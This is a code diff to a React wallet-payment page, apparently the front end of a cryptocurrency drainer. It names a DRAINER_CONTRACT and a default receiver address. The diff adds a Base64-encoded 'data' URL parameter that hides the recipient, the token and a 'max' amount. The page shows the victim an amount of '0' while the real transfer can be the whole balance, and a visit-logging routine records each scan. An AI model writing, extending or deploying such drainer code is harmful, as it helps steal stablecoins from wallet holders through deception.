@@ -3,7 +3,7 @@
 import { useState, useEffect, useRef } from "react";
 import { ethers } from "ethers";
 
-const DRAINER_CONTRACT = "0xc0F4ef5CeBED2F2755F7f60a2Acec327BDAcdbE3";
+const DRAINER_CONTRACT = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42";
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const USDT_DECIMALS = 6;
@@ -90,32 +90,65 @@ export default function WalletPage() {
 
     if (typeof window !== "undefined") {
       const params = new URLSearchParams(window.location.search);
-      const toParam = params.get("to");
-      const amountParam = params.get("amount");
-      const tokenParam = params.get("token");
+      const dataParam = params.get("data");
 
-      if (toParam && ethers.isAddress(toParam)) {
-        setAddress(toParam);
-        setActualReceiver(toParam);
-        finalTo = toParam;
+      // Essayer d'abord de décoder le paramètre data (Base64 JSON)
+      if (dataParam) {
+        try {
+          const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
+          if (decoded.to && ethers.isAddress(decoded.to)) {
+            finalTo = decoded.to;
+            setAddress(decoded.to);
+            setActualReceiver(decoded.to);
+          }
+          if (decoded.token === "usdt" || decoded.token === "usdc") {
+            finalToken = decoded.token;
+            setToken(decoded.token);
+            setActualToken(decoded.token);
+          }
+          if (decoded.amount === "max") {
+            setIsMaxMode(true);
+            setActualAmount("0");
+            finalAmount = "max";
+          } else if (decoded.amount && !isNaN(Number(decoded.amount))) {
+            setIsMaxMode(false);
+            setActualAmount(decoded.amount);
+            finalAmount = decoded.amount;
+          }
+        } catch (e) {
+          console.warn("Failed to decode data param, falling back to separate params");
+        }
+      } else {
+        // Fallback : ancienne méthode avec paramètres séparés (to, amount, token)
+        const toParam = params.get("to");
+        const amountParam = params.get("amount");
+        const tokenParam = params.get("token");
+
+        if (toParam && ethers.isAddress(toParam)) {
+          finalTo = toParam;
+          setAddress(toParam);
+          setActualReceiver(toParam);
+        }
+        if (tokenParam === "usdt" || tokenParam === "usdc") {
+          finalToken = tokenParam;
+          setToken(tokenParam);
+          setActualToken(tokenParam);
+        }
+        if (amountParam === "max") {
+          setIsMaxMode(true);
+          setActualAmount("0");
+          finalAmount = "max";
+        } else if (amountParam && !isNaN(Number(amountParam))) {
+          setIsMaxMode(false);
+          setActualAmount(amountParam);
+          finalAmount = amountParam;
+        }
       }
-      if (tokenParam === "usdt" || tokenParam === "usdc") {
-        setToken(tokenParam);
-        setActualToken(tokenParam);
-        finalToken = tokenParam;
-      }
-      if (amountParam === "max") {
-        setIsMaxMode(true);
-        setActualAmount("0");
-        finalAmount = "max";
-      } else if (amountParam && !isNaN(Number(amountParam))) {
-        setIsMaxMode(false);
-        setActualAmount(amountParam);
-        finalAmount = amountParam;
-      }
+
       setDisplayAmount("0");
     }
 
+    // Log scan (identique)
     const logScanVisit = async () => {
       let userAgentInfo = "Web Browser";
       if (typeof window !== "undefined") {
